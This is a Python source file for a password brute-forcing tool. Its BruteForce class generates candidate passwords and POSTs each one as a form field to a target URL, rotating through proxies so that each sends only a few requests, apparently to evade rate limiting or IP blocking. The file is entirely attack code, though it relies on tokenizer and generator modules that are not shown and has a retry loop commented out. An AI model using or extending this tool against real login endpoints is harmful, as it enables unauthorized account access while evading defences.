import requests;
from core.tokenizer import Tokenizer;
from core.generator import PasswordGenerator;

class BruteForce:
    def __init__(self, url, proxies) -> None:
        self.key = None;
        self.url = url;
        self.proxies = proxies;
        self.data = {};
        self.request = requests.Session();
        
        # Initialize the tokenizer and extract tokens from the characthers.txt file
        self.tokenizer = Tokenizer();
        self.tokens = self.tokenizer.init();
        
        # get value from cached index
        cached_index = [];
        
        # Generate the possible combinations
        self.generator = PasswordGenerator(self.tokens, cached_index);
    
    def setKey(self, key):
        self.key = key;
        
    def set(self, key, value):
        self.data[key] = value;
    
    def execute(self):        
        # initialze the request variable
        with self.request as req:
            # loop through list of proxies
            for proxy in self.proxies:                
                # make three request per proxy
                self.generator.generate(self.attack, { 'req' : req, 'proxy' : proxy["ip"] });
        
    def attack(self, value, indexes, data):
        i = 0;
        
        # set proxy and req
        req = data["req"];
        proxy = data["proxy"];
        
        # add generated passkey into JSON data
        self.data[self.key] = value;
        
        print(proxy);
        # while i < 3:
        try:
            response = req.post(self.url, proxies={ 'http' : f"http://{proxy}" }, data=self.data);
            print(response);
        except Exception as e:
            # handle error from Request
            print(e);
        finally:
            # store indexes cache value to the index size to continue testing from last stop
            pass;
        # i += 1;
            